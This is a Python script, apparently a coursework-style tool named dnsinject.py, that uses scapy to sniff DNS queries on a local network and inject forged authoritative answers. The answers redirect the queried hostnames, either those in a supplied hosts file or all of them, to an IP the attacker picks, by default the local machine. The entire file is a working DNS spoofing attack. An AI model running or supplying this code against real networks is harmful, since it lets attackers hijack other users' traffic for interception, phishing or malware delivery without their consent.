import argparse
import netifaces as ni
from scapy.all import *

def get_ip(ifname):
    # for reference: ni.ifaddresses('eth0') outputs ----
    # ---> {2: [{'broadcast': '172.17.255.255', 'addr': '172.17.0.2', 'mask': '255.255.0.0'}], 17: [{'addr': '02:42:ac:11:00:02', 'broadcast': 'ff:ff:ff:ff:ff:ff'}]}
    ip = ni.ifaddresses(ifname)[ni.AF_INET][0]['addr']
    print(ip)
    return ip

def dnsinject(pkt):
    if pkt.haslayer(IP) and pkt.haslayer(DNSQR) and pkt[DNS].qr == 0: # check for IP && DNSQR headers + make sure it is a DNS query
        host = pkt[DNSQR].qname # hostname of DNSQR packet
        print("host: ", host)
        if d["hostfile"] != None: # the file of hostnames was given
            if not host.decode().rstrip(".") in ip_mapping.keys(): # not a host in file
                return
            redir_ip = ip_mapping[host.decode().rstrip(".")] # get the ip of the host matching the given file
        else: # hostnames file not given
            redir_ip = get_ip(str(d["interface"]))
        
        # SPOOFING TIME i.e. respond to dns query 
        if pkt.haslayer(UDP):
            ip = IP(dst=pkt[IP].src, src=pkt[IP].dst) # swap the ip src and dst for the packet
            udp = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) # swap the udp src and dst ports for the packet
            dnsrr = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=15, rdata=redir_ip) # dnsrr = DNS Resource Record
            dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, ancount=1, qdcount=1, nscount=0, arcount=0, an=dnsrr)
            spoof = ip/udp/dns
            send(spoof)
        elif pkt.haslayer(TCP): # same as ^ but for TCP
            ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
            tcp = TCP(dport=pkt[TCP].sport, sport=pkt[TCP].dport)
            dnsrr = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=15, rdata=redir_ip)
            dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, ancount=1, qdcount=1, nscount=0, arcount=0, an=dnsrr)
            spoof = ip/tcp/dns
            send(spoof)
        else:
            return
    # send(spoof)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(conflict_handler="resolve")
    parser.add_argument('-i', dest="interface", default=scapy.interfaces.get_working_if()) # default for interface is an interface that works :D
    parser.add_argument('-h', dest="hostfile")
    args = parser.parse_args() # Example: (python3 dnsinject.py -> Namespace(interface=<NetworkInterface eth0 [UP+BROADCAST+RUNNING+SLAVE]>, hostsmap=None))
    d = vars(args) # access Namespace dict

    ip_mapping = {}

    # whether hostfile specified or not
    if d["hostfile"] == None:
        redir_ip = get_ip(str(d["interface"])) # should be local ip
        print(redir_ip) # FOR TESTING
    else:
        redir_ip = ""
        file = open(d["hostfile"], "r")
        for line in file:
            hostnames = line.split(',')
            ip_mapping[hostnames[1].strip()] = hostnames[0].strip() # set hostnames to their respective ip as dict
        print(ip_mapping) # FOR TESTING

    # Filter UDP port 53 and DNS queries only 
    packets = sniff(filter="udp dst port 53 and udp[10] & 0x80 = 0", iface=d["interface"], prn=dnsinject, store=False)

    # print(packets) # FOR TESTING
    # print(d)
